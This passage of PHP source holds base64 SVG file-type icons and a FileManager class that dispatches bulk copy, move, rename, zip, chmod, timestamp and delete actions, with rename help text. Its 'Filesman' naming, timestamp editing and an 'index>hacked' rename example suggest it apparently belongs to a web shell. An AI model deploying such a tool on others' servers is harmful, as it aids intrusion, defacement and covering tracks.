                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNiAxNiI+PHBhdGggZmlsbD0iIzAyODhkMSIgZD0iTTIgMmgxMnYxMkgyVjJtNy4xNCA5LjkwN2MuMzMzLjY1MyAxLjAwNyAxLjE1MyAyLjA2IDEuMTUzIDEuMDY3IDAgMS44NjctLjU1MyAxLjg2Ny0xLjU3MyAwLS45NC0uNTQtMS4zNi0xLjUtMS43NzRsLS4yOC0uMTJjLS40ODctLjIwNi0uNjk0LS4zNDYtLjY5NC0uNjggMC0uMjczLjIwNy0uNDg2LjU0LS40ODYuMzIgMCAuNTM0LjE0LjcyNy40ODZsLjg3My0uNThjLS4zNjYtLjY0LS44ODYtLjg4Ni0xLjYtLjg4Ni0xLjAwNiAwLTEuNjUzLjY0LTEuNjUzIDEuNDg2IDAgLjkyLjU0IDEuMzU0IDEuMzUzIDEuN2wuMjguMTJjLjUyLjIyNy44MjcuMzY3LjgyNy43NTQgMCAuMzItLjMuNTUzLS43NjcuNTUzLS41NTMgMC0uODczLS4yODctMS4xMTMtLjY4N2wtLjkyLjUzNE04LjY2NyA3LjVINS4zMzN2MWgxdjQuODMzSDcuNVY4LjVoMS4xNjd6Ii8+PC9zdmc+';
                break;

            case 'json':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgLTk2MCA5NjAgOTYwIj48cGF0aCBmaWxsPSIjZjlhODI1IiBkPSJNNTYwLTE2MHYtODBoMTIwcTE3IDAgMjguNS0xMS41VDcyMC0yODB2LTgwcTAtMzggMjItNjl0NTgtNDR2LTE0cS0zNi0xMy01OC00NHQtMjItNjl2LTgwcTAtMTctMTEuNS0yOC41VDY4MC03MjBINTYwdi04MGgxMjBxNTAgMCA4NSAzNXQzNSA4NXY4MHEwIDE3IDExLjUgMjguNVQ4NDAtNTYwaDQwdjE2MGgtNDBxLTE3IDAtMjguNSAxMS41VDgwMC0zNjB2ODBxMCA1MC0zNSA4NXQtODUgMzVINTYwWm0tMjgwIDBxLTUwIDAtODUtMzV0LTM1LTg1di04MHEwLTE3LTExLjUtMjguNVQxMjAtNDAwSDgwdi0xNjBoNDBxMTcgMCAyOC41LTExLjVUMTYwLTYwMHYtODBxMC01MCAzNS04NXQ4NS0zNWgxMjB2ODBIMjgwcS0xNyAwLTI4LjUgMTEuNVQyNDAtNjgwdjgwcTAgMzgtMjIgNjl0LTU4IDQ0djE0cTM2IDEzIDU4IDQ0dDIyIDY5djgwcTAgMTcgMTEuNSAyOC41VDI4MC0yNDBoMTIwdjgwSDI4MFoiLz48L3N2Zz4=';
                break;

            case 'lib':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTAgMGgyNHYyNEgwVjB6Ii8+PHBhdGggZmlsbD0iIzhiYzM0YSIgZD0iTTQgNkgydjE0YzAgMS4xLjkgMiAyIDJoMTR2LTJINFY2em0xNi00SDhjLTEuMSAwLTIgLjktMiAydjEyYzAgMS4xLjkgMiAyIDJoMTJjMS4xIDAgMi0uOSAyLTJWNGMwLTEuMS0uOS0yLTItMnptMCAxNEg4VjRoMTJ2MTJ6TTEwIDloOHYyaC04em0wIDNoNHYyaC00em0wLTZoOHYyaC04eiIvPjwvc3ZnPg==';
                break;

            case 'lock':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2ZmZDU0ZiIgZD0iTTI1IDEyaC0zVjhhNiA2IDAgMCAwLTEyIDB2NEg3YTEgMSAwIDAgMC0xIDF2MTZhMSAxIDAgMCAwIDEgMWgxOGExIDEgMCAwIDAgMS0xVjEzYTEgMSAwIDAgMC0xLTFaTTE0IDhhMiAyIDAgMCAxIDQgMHY0aC00Wm0yIDE3YTQgNCAwIDEgMSA0LTQgNCA0IDAgMCAxLTQgNFoiLz48L3N2Zz4=';
                break;

            case 'markdown':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzQyYTVmNSIgZD0ibTE0IDEwLTQgMy41TDYgMTBINHYxMmg0di02bDIgMiAyLTJ2Nmg0VjEwaC0yem0xMiA2di02aC00djZoLTRsNiA4IDYtOGgtNHoiLz48L3N2Zz4=';
                break;

            case 'pdf':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2VmNTM1MCIgZD0iTTEzIDloNS41TDEzIDMuNVY5TTYgMmg4bDYgNnYxMmEyIDIgMCAwIDEtMiAySDZhMiAyIDAgMCAxLTItMlY0YTIgMiAwIDAgMSAyLTJtNC45MyAxMC40NGMuNDEuOS45MyAxLjY0IDEuNTMgMi4xNWwuNDEuMzJjLS44Ny4xNi0yLjA3LjQ0LTMuMzQuOTNsLS4xMS4wNC41LTEuMDRjLjQ1LS44Ny43OC0xLjY2IDEuMDEtMi40bTYuNDggMy44MWMuMTgtLjE4LjI3LS40MS4yOC0uNjYuMDMtLjItLjAyLS4zOS0uMTItLjU1LS4yOS0uNDctMS4wNC0uNjktMi4yOC0uNjlsLTEuMjkuMDctLjg3LS41OGMtLjYzLS41Mi0xLjItMS40My0xLjYtMi41NmwuMDQtLjE0Yy4zMy0xLjMzLjY0LTIuOTQtLjAyLTMuNmEuODUzLjg1MyAwIDAgMC0uNjEtLjI0aC0uMjRjLS4zNyAwLS43LjM5LS43OS43Ny0uMzcgMS4zMy0uMTUgMi4wNi4yMiAzLjI3di4wMWMtLjI1Ljg4LS41NyAxLjktMS4wOCAyLjkzbC0uOTYgMS44LS44OS40OWMtMS4yLjc1LTEuNzcgMS41OS0xLjg4IDIuMTItLjA0LjE5LS4wMi4zNi4wNS41NGwuMDMuMDUuNDguMzEuNDQuMTFjLjgxIDAgMS43My0uOTUgMi45Ny0zLjA3bC4xOC0uMDdjMS4wMy0uMzMgMi4zMS0uNTYgNC4wMy0uNzUgMS4wMy41MSAyLjI0Ljc0IDMgLjc0LjQ0IDAgLjc0LS4xMS45MS0uM20tLjQxLS43MS4wOS4xMWMtLjAxLjEtLjA0LjExLS4wOS4xM2gtLjA0bC0uMTkuMDJjLS40NiAwLTEuMTctLjE5LTEuOS0uNTEuMDktLjEuMTMtLjEuMjMtLjEgMS40IDAgMS44LjI1IDEuOS4zNU03LjgzIDE3Yy0uNjUgMS4xOS0xLjI0IDEuODUtMS42OSAyIC4wNS0uMzguNS0xLjA0IDEuMjEtMS42OWwuNDgtLjMxbTMuMDItNi45MWMtLjIzLS45LS4yNC0xLjYzLS4wNy0yLjA1bC4wNy0uMTIuMTUuMDVjLjE3LjI0LjE5LjU2LjA5IDEuMWwtLjAzLjE2LS4xNi44MnoiLz48L3N2Zz4=';
                break;

            case 'perl':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzk1NzVjZCIgZD0iTTEyLjUgMTRjLTEgMC0zIDEtMyAyIDAgMiAzIDIgMyAydi0xYTEgMSAwIDAgMS0xLTEgMSAxIDAgMCAxIDEtMXYtMW0wIDVzLTQtLjUtNC0yLjVjMC0zIDMtMy43NSA0LTMuNzVWMTEuNWMtMSAwLTUgMS41LTUgNC41IDAgNCA1IDQgNSA0di0xTTEwLjU3IDcuMDNsMS4xOS41M2MuNDMtMi40NCAxLjU4LTQuMDYgMS41OC00LjA2LS40MyAxLjAzLS43MSAxLjg4LS44OSAyLjU1QzEzLjY2IDMuNTUgMTYuMTEgMiAxNi4xMSAyYTE1LjkxNiAxNS45MTYgMCAwIDAtMi42NCAzLjUzYzEuNTgtMS42OCAzLjc3LTIuNzggMy43Ny0yLjc4LTIuNjkgMS43Mi0zLjkgNC40NS00LjIgNS4yMWwuNTUuMDhjMCAuNTIgMCAxIC4yNSAxLjM4Ljc2IDEuODkgNC42NiAyLjA1IDQuNjYgNi41OHMtNC4wMyA2LTYuMTcgNi02LjgzLS45Ny02LjgzLTYgNC45NS01LjA3IDUuODMtNy4wOGMuMTItLjM4LS43Ni0xLjg5LS43Ni0xLjg5eiIvPjwvc3ZnPg==';
                break;

            case 'php':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzFFODhFNSIgZD0iTTEyIDE4LjA4Yy02LjYzIDAtMTItMi43Mi0xMi02LjA4czUuMzctNi4wOCAxMi02LjA4UzI0IDguNjQgMjQgMTJzLTUuMzcgNi4wOC0xMiA2LjA4bS01LjE5LTcuOTVjLjU0IDAgLjkxLjEgMS4wOS4zMS4xOC4yLjIyLjU2LjEzIDEuMDMtLjEuNTMtLjI5Ljg3LS41OCAxLjA5LS4yOC4yMi0uNzEuMzMtMS4yOS4zM2gtLjg3bC41My0yLjc2aC45OW0tMy41IDUuNTVoMS40NGwuMzQtMS43NWgxLjIzYy41NCAwIC45OC0uMDYgMS4zMy0uMTcuMzUtLjEyLjY3LS4zMS45Ni0uNTguMjQtLjIyLjQzLS40Ni41OC0uNzMuMTUtLjI2LjI2LS41Ni4zMS0uODguMTYtLjc4LjA1LTEuMzktLjMzLTEuODItLjM5LS40NC0uOTktLjY1LTEuODItLjY1SDQuNTlsLTEuMjggNi41OG03LjI1LTguMzMtMS4yOCA2LjU4aDEuNDJsLjc0LTMuNzdoMS4xNGMuMzYgMCAuNi4wNi43MS4xOC4xMS4xMi4xMy4zNC4wNy42NmwtLjU3IDIuOTNoMS40NWwuNTktMy4wN2MuMTMtLjYyLjAzLTEuMDctLjI3LTEuMzYtLjMtLjI3LS44NS0uNC0xLjY1LS40aC0xLjI3TDEyIDcuMzVoLTEuNDRNMTggMTAuMTNjLjU1IDAgLjkxLjEgMS4wOS4zMS4xOC4yLjIyLjU2LjEzIDEuMDMtLjEuNTMtLjI5Ljg3LS41NyAxLjA5LS4yOS4yMi0uNzIuMzMtMS4zLjMzaC0uODVsLjUtMi43NmgxbS0zLjUgNS41NWgxLjQ0bC4zNC0xLjc1aDEuMjJjLjU1IDAgMS0uMDYgMS4zNS0uMTcuMzUtLjEyLjY1LS4zMS45NS0uNTguMjQtLjIyLjQ0LS40Ni41OC0uNzMuMTUtLjI2LjI2LS41Ni4zMi0uODguMTUtLjc4LjA0LTEuMzktLjM0LTEuODItLjM2LS40NC0uOTktLjY1LTEuODItLjY1aC0yLjc1bC0xLjI5IDYuNTh6Ii8+PC9zdmc+';
                break;

            case 'powershell':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzAzYTlmNCIgZD0iTTI5LjA3IDZINy42NzdBMS41MzUgMS41MzUgMCAwIDAgNi4yNCA3LjExM2wtNC4yIDE3Ljc3NEEuODUyLjg1MiAwIDAgMCAyLjkzIDI2aDIxLjM5M2ExLjUzNSAxLjUzNSAwIDAgMCAxLjQzNi0xLjExM0wyOS45NiA3LjExMkEuODUyLjg1MiAwIDAgMCAyOS4wNyA2Wk04LjYyNiAyMy43OTdhMS40MDIgMS40MDIgMCAwIDEtMS44MTQtLjMxbC0uMDA3LS4wMDlhMS4wNzUgMS4wNzUgMCAwIDEgLjMxNS0xLjU5OWw5LjYtNi4wNjEtNi4xMDItNS44NTItLjAxLS4wMWExLjA2OCAxLjA2OCAwIDAgMSAuMDg0LTEuNjI1bC4wMzctLjAzYTEuMzggMS4zOCAwIDAgMSAxLjguMDdsNy4yMzMgNi45NTdhMS4xMDggMS4xMDggMCAwIDEgLjIzNi43MzkgMS4wNzUgMS4wNzUgMCAwIDEtLjQxMi43OWMtLjA3NC4wNC0uMTQ2LjExOS0xMC45NTEgNi45MzVaTTI0IDIyLjk0QTEuMTM1IDEuMTM1IDAgMCAxIDIyLjgwMyAyNGgtNS42MzRhMS4wNjEgMS4wNjEgMCAxIDEgLjAwMS0yLjExMmg1LjYzM0ExLjEzNCAxLjEzNCAwIDAgMSAyNCAyMi45MzhaIi8+PC9zdmc+';
                break;

            case 'python':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzNjNzhhYSIgZD0iTTkuODYgMkEyLjg2IDIuODYgMCAwIDAgNyA0Ljg2djEuNjhoNC4yOWMuMzkgMCAuNzEuNTcuNzEuOTZINC44NkEyLjg2IDIuODYgMCAwIDAgMiAxMC4zNnYzLjc4MWEyLjg2IDIuODYgMCAwIDAgMi44NiAyLjg2aDEuMTh2LTIuNjhhMi44NSAyLjg1IDAgMCAxIDIuODUtMi44Nmg1LjI1YzEuNTggMCAyLjg2LTEuMjcxIDIuODYtMi44NTFWNC44NkEyLjg2IDIuODYgMCAwIDAgMTQuMTQgMnptLS43MiAxLjYxYy40IDAgLjcyLjEyLjcyLjcxcy0uMzIuODkxLS43Mi44OTFjLS4zOSAwLS43MS0uMy0uNzEtLjg5cy4zMi0uNzExLjcxLS43MTF6Ii8+PHBhdGggZmlsbD0iI2ZkZDgzNSIgZD0iTTE3Ljk1OSA3djIuNjhhMi44NSAyLjg1IDAgMCAxLTIuODUgMi44NTlIOS44NkEyLjg1IDIuODUgMCAwIDAgNyAxNS4zODl2My43NWEyLjg2IDIuODYgMCAwIDAgMi44NiAyLjg2aDQuMjhBMi44NiAyLjg2IDAgMCAwIDE3IDE5LjE0di0xLjY4aC00LjI5MWMtLjM5IDAtLjcwOS0uNTctLjcwOS0uOTZoNy4xNEEyLjg2IDIuODYgMCAwIDAgMjIgMTMuNjRWOS44NkEyLjg2IDIuODYgMCAwIDAgMTkuMTQgN3pNOC4zMiAxMS41MTNsLS4wMDQuMDA0Yy4wMTItLjAwMi4wMjUtLjAwMS4wMzgtLjAwNHptNi41NCA3LjI3NmMuMzkgMCAuNzEuMy43MS44OWEuNzEuNzEgMCAwIDEtLjcxLjcxYy0uNCAwLS43Mi0uMTItLjcyLS43MXMuMzItLjg5LjcyLS44OXoiLz48L3N2Zz4=';
                break;

            case 'ruby':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2Y0NDMzNiIgZD0iTTE4LjA0MSAzLjE3N2MyLjI0LjM4MiAyLjg3OSAxLjkxOSAyLjg0MyAzLjUyN1Y2LjY3bC0xLjAxMyAxMy4yNjYtMTMuMTMyLjg5N2guMDA4Yy0xLjA5My0uMDQ0LTMuNTE4LS4xNTEtMy42MzQtMy41NDVsMS4yMTctMi4yMjIgMi40NjIgNS43NCAyLjA5Ny02Ljc3LS4wNDUuMDA5LjAxOC0uMDE4IDYuODUgMi4xODZMMTMuOTQ1IDkuM2w2LjUzLS40MDktNS4xNDQtNC4yMTIgMi43MS0xLjUxdi4wMDlNMy4xMTMgMTcuMjUydi4wMTctLjAxN002LjkxNiA2Ljg3NGMyLjYzLTIuNjIyIDYuMDMzLTQuMTY4IDcuMzQtMi44NDQgMS4yOTcgMS4zMDYtLjA3MiA0LjUyMy0yLjcwMiA3LjEzNS0yLjY2NiAyLjYxMy02LjAxNSA0LjI0OC03LjMyMiAyLjkzMy0xLjMwNi0xLjMyNC4wMzYtNC42MTIgMi42NzUtNy4yMjR6Ii8+PC9zdmc+';
                break;

            case 'settings':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTAgMGgyNHYyNEgwVjB6Ii8+PHBhdGggZmlsbD0iIzQyYTVmNSIgZD0iTTE5LjQzIDEyLjk4Yy4wNC0uMzIuMDctLjY0LjA3LS45OCAwLS4zNC0uMDMtLjY2LS4wNy0uOThsMi4xMS0xLjY1Yy4xOS0uMTUuMjQtLjQyLjEyLS42NGwtMi0zLjQ2YS41LjUgMCAwIDAtLjYxLS4yMmwtMi40OSAxYy0uNTItLjQtMS4wOC0uNzMtMS42OS0uOThsLS4zOC0yLjY1QS40ODguNDg4IDAgMCAwIDE0IDJoLTRjLS4yNSAwLS40Ni4xOC0uNDkuNDJsLS4zOCAyLjY1Yy0uNjEuMjUtMS4xNy41OS0xLjY5Ljk4bC0yLjQ5LTFhLjU2Ni41NjYgMCAwIDAtLjE4LS4wM2MtLjE3IDAtLjM0LjA5LS40My4yNWwtMiAzLjQ2Yy0uMTMuMjItLjA3LjQ5LjEyLjY0bDIuMTEgMS42NWMtLjA0LjMyLS4wNy42NS0uMDcuOTggMCAuMzMuMDMuNjYuMDcuOThsLTIuMTEgMS42NWMtLjE5LjE1LS4yNC40Mi0uMTIuNjRsMiAzLjQ2YS41LjUgMCAwIDAgLjYxLjIybDIuNDktMWMuNTIuNCAxLjA4LjczIDEuNjkuOThsLjM4IDIuNjVjLjAzLjI0LjI0LjQyLjQ5LjQyaDRjLjI1IDAgLjQ2LS4xOC40OS0uNDJsLjM4LTIuNjVjLjYxLS4yNSAxLjE3LS41OSAxLjY5LS45OGwyLjQ5IDFjLjA2LjAyLjEyLjAzLjE4LjAzLjE3IDAgLjM0LS4wOS40My0uMjVsMi0zLjQ2Yy4xMi0uMjIuMDctLjQ5LS4xMi0uNjRsLTIuMTEtMS42NXptLTEuOTgtMS43MWMuMDQuMzEuMDUuNTIuMDUuNzMgMCAuMjEtLjAyLjQzLS4wNS43M2wtLjE0IDEuMTMuODkuNyAxLjA4Ljg0LS43IDEuMjEtMS4yNy0uNTEtMS4wNC0uNDItLjkuNjhjLS40My4zMi0uODQuNTYtMS4yNS43M2wtMS4wNi40My0uMTYgMS4xMy0uMiAxLjM1aC0xLjRsLS4xOS0xLjM1LS4xNi0xLjEzLTEuMDYtLjQzYy0uNDMtLjE4LS44My0uNDEtMS4yMy0uNzFsLS45MS0uNy0xLjA2LjQzLTEuMjcuNTEtLjctMS4yMSAxLjA4LS44NC44OS0uNy0uMTQtMS4xM2MtLjAzLS4zMS0uMDUtLjU0LS4wNS0uNzRzLjAyLS40My4wNS0uNzNsLjE0LTEuMTMtLjg5LS43LTEuMDgtLjg0LjctMS4yMSAxLjI3LjUxIDEuMDQuNDIuOS0uNjhjLjQzLS4zMi44NC0uNTYgMS4yNS0uNzNsMS4wNi0uNDMuMTYtMS4xMy4yLTEuMzVoMS4zOWwuMTkgMS4zNS4xNiAxLjEzIDEuMDYuNDNjLjQzLjE4LjgzLjQxIDEuMjMuNzFsLjkxLjcgMS4wNi0uNDMgMS4yNy0uNTEuNyAxLjIxLTEuMDcuODUtLjg5LjcuMTQgMS4xM3pNMTIgOGMtMi4yMSAwLTQgMS43OS00IDRzMS43OSA0IDQgNCA0LTEuNzkgNC00LTEuNzktNC00LTR6bTAgNmMtMS4xIDAtMi0uOS0yLTJzLjktMiAyLTIgMiAuOSAyIDItLjkgMi0yIDJ6Ii8+PC9zdmc+';
                break;

            case 'table':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzhiYzM0YSIgZD0iTTYgMmg4bDYgNnYxMmEyIDIgMCAwIDEtMiAySDZhMiAyIDAgMCAxLTItMlY0YTIgMiAwIDAgMSAyLTJtNyAxLjVWOWg1LjVMMTMgMy41bTQgNy41aC00djJoMWwtMiAxLjY3TDEwIDEzaDF2LTJIN3YyaDFsMyAyLjVMOCAxOEg3djJoNHYtMmgtMWwyLTEuNjdMMTQgMThoLTF2Mmg0di0yaC0xbC0zLTIuNSAzLTIuNWgxdi0yeiIvPjwvc3ZnPg==';
                break;

            case 'template':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzkwYTRhZSIgZD0iTTEzIDloMXYyaC0zVjdoMnYybTUuNSAwLTIuMTItMi4xMiAxLjI1LTEuMjVMMjAgOHYyaC0ydjFoLTNWOWgzLjVNMTMgMy41VjJoLTF2MmgxdjJoLTJWNEg5VjJIOHYySDZ2MUg0VjRjMC0xLjExLjg5LTIgMi0yaDhsMi4zNiAyLjM2LTEuMjUgMS4yNUwxMyAzLjVNMjAgMjBhMiAyIDAgMCAxLTIgMmgtMnYtMmgydi0xaDJ2MW0tMi01aDJ2M2gtMnYtM20tNiA3di0yaDN2MmgtM20tNCAwdi0yaDN2Mkg4bS0yIDBhMiAyIDAgMCAxLTItMnYtMmgydjJoMXYySDZtLTItOGgydjNINHYtM20wLTRoMnYzSDR2LTNtMTQgMWgydjNoLTJ2LTNNNCA2aDJ2M0g0VjZ6Ii8+PC9zdmc+';
                break;

            case 'video':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2ZmOTgwMCIgZD0ibTI0IDYgMiA2aC00bC0yLTZoLTNsMiA2aC00bC0yLTZoLTNsMiA2SDhMNiA2SDVhMyAzIDAgMCAwLTMgM3YxNGEzIDMgMCAwIDAgMyAzaDIyYTMgMyAwIDAgMCAzLTNWNloiLz48L3N2Zz4=';
                break;

            case 'xml':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzhiYzM0YSIgZD0iTTEzIDloNS41TDEzIDMuNVY5TTYgMmg4bDYgNnYxMmEyIDIgMCAwIDEtMiAySDZhMiAyIDAgMCAxLTItMlY0YzAtMS4xMS44OS0yIDItMm0uMTIgMTMuNSAzLjc0IDMuNzQgMS40Mi0xLjQxLTIuMzMtMi4zMyAyLjMzLTIuMzMtMS40Mi0xLjQxLTMuNzQgMy43NG0xMS4xNiAwLTMuNzQtMy43NC0xLjQyIDEuNDEgMi4zMyAyLjMzLTIuMzMgMi4zMyAxLjQyIDEuNDEgMy43NC0zLjc0eiIvPjwvc3ZnPg==';
                break;

            case 'yaml':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI0ZGNTI1MiIgZD0iTTEzIDloNS41TDEzIDMuNVY5TTYgMmg4bDYgNnYxMmMwIDEuMS0uOSAyLTIgMkg2Yy0xLjEgMC0yLS45LTItMlY0YzAtMS4xLjktMiAyLTJtMTIgMTZ2LTJIOXYyaDltLTQtNHYtMkg2djJ6Ii8+PC9zdmc+';
                break;

            case 'zip':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2FmYjQyYiIgZD0iTTE0IDE3aC0ydi0yaC0ydi0yaDJ2MmgybTAtNmgtMnYyaDJ2MmgtMnYtMmgtMlY5aDJWN2gtMlY1aDJ2MmgybTUtNEg1Yy0xLjExIDAtMiAuODktMiAydjE0YTIgMiAwIDAgMCAyIDJoMTRhMiAyIDAgMCAwIDItMlY1YTIgMiAwIDAgMC0yLTJ6Ii8+PC9zdmc+';
                break;

            default:
                break;
        }

        return $icons;
    }
}
class FileManager
{
    /**
     * Edit File/Folder
     * @param string $dir Directory
     * @param string $file Filename
     * @param string $value Content
     * @param string $opt Option
     */
    public static function __file_manager($dir, $file, $value, $opt)
    {
        $text = "";

        if (str_contains($opt, 'bulksv')) {

            switch ($opt) {
                case 'bulksv_bulk_copy':
                case 'bulksv_bulk_move':
                    $content = Filesman::__move_copy($file, $value, $opt);
                    break;

                case 'bulksv_bulk_rename':
                    $content = Filesman::__rename($file, $value, $opt);
                    break;

                case 'bulksv_bulk_zip':
                    $content = Filesman::__zip($file, $value, $opt);
                    break;

                case 'bulksv_bulk_chmod':
                    $content = Filesman::__chmod($file, $value, $opt);
                    break;

                case 'bulksv_bulk_time':
                    $content = Filesman::__time($file, $value, $opt);
                    break;

                case 'bulksv_bulk_delete':
                    $content = Filesman::__delete($file, $value, $opt);
                    break;


                default:
                    # code...
                    break;
            }
        } else if (str_contains($opt, 'bulk')) {

            $del = false;
            $renamePrefix = '';

            switch ($opt) {
                case 'bulk_copy':
                    $valElement = '<input type="text" id="value" value="' . $dir . '"  class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Destination | path/to/folder">';
                    $label = 'Copy Destination';
                    $action = 'bulk_copy';
                    break;

                case 'bulk_move':
                    $valElement = '<input type="text" id="value" value="' . $dir . '"  class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Destination | path/to/folder">';
                    $label = 'Move Destination';
                    $action = 'bulk_move';
                    break;

                case 'bulk_rename':
                    $valElement = '
                    <div class="relative flex justify-start w-full">
                        <button onclick="$(`#value`).val(``)" class="absolute inset-y-0 rtl:inset-r-0 end-0 flex items-center pe-3">
                            <i class="bx bx-x text-2xl text-themecolor-400"></i>
                        </button>
                        <input type="text" id="value" value="{counter}_{C(name)}{C(ext)}" class="block pt-2.5 pe-10 text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Rename Prefix">
                    </div>';

                    $label = 'Rename Prefix';
                    $renamePrefix = '<div class="relative overflow-auto w-full">
                    <details class="group [&_summary::-webkit-details-marker]:hidden my-4">
                        <summary class="flex cursor-pointer items-center justify-start mb-2 gap-1.5 rounded-lg text-foreground" >
                        <h2 class="font-medium text-sm">Rename Prefix Option</h2>

                        <svg
                            class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
                        </svg>
                        </summary>
                        <div class="h-auto flex-1">
                        <div class="h-auto overflow-auto whitespace-pre block p-2 w-full text-sm rounded-lg border bg-themecolor-700 border-themecolor-600 text-themecolor-400"><span class="text-themecolor-300">Usage: <span class="text-themecolor-green">{format}</span> or <span class="text-themecolor-green">{modifier(format)}</span> or <span class="text-themecolor-green">{word_modifier(params,format)}</span></span>

  * <span class="text-themecolor-300">F[<span class="text-themecolor-400">prefix wrapper</span>]</span> : forcing the process, <span class="text-orange-300">not recommended</span>
  * <span class="text-themecolor-300">{}</span>: to wrap the prefix, <span class="text-themecolor-green">IMPORTANT</span>
  * <span class="text-themecolor-300">{format}</span> or <span class="text-themecolor-300">{modifier(format)}</span> or <span class="text-themecolor-300">{word_modifier(params,format)}</span> : e.g {name} or {C(name)} or {WR(index>hacked,name)}

<span class="text-themecolor-300">Format Specifiers: <span class="text-orange-300">{format}</span></span>
  * <span class="text-themecolor-300">name</span> : the name of each item
  * <span class="text-themecolor-300">ext</span> : the extension of each item (only for files)
  * <span class="text-themecolor-300">counter</span> : a count number for each item
  * <span class="text-themecolor-300">type</span> : the type of each item (file or dir)

<span class="text-themecolor-300">Modifiers: <span class="text-orange-300">modifiers(<span class="text-themecolor-400">format</span>)</span></span>
  * <span class="text-themecolor-300">U()</span> : uppercase the output of the format
  * <span class="text-themecolor-300">L()</span> : lowercase the output of the format
  * <span class="text-themecolor-300">S()</span> : shuffle the output of the format
  * <span class="text-themecolor-300">C()</span> : shuffle the case output of the format
  * <span class="text-themecolor-300">D()</span> : delete the output of the format

<span class="text-themecolor-300">Word Modifiers: <span class="text-orange-300">word_modifiers(<span class="text-themecolor-400">params</span>,<span class="text-themecolor-400">format</span>)</span></span>
  * <span class="text-themecolor-300">WD(<span class="text-themecolor-400">value</span>,<span class="text-themecolor-400">format</span>)</span> : `Word Delete`, delete specific word/char
  * <span class="text-themecolor-300">WR(<span class="text-themecolor-400">old<span class="text-themecolor-300">></span>new</span>,<span class="text-themecolor-400">format</span>)</span> : `Word Replace`, replace specific word/char

<span class="text-themecolor-300">Example Prefix Formats:</span>
  * <span class="text-themecolor-300">F[{D(counter)}{name}]</span> => 01_file.txt, 02_file.txt > file.txt
  * <span class="text-themecolor-300">{counter}_{U(type)}_{S(name)}{ext}</span> => 01_FILE_6xSl3p0.php
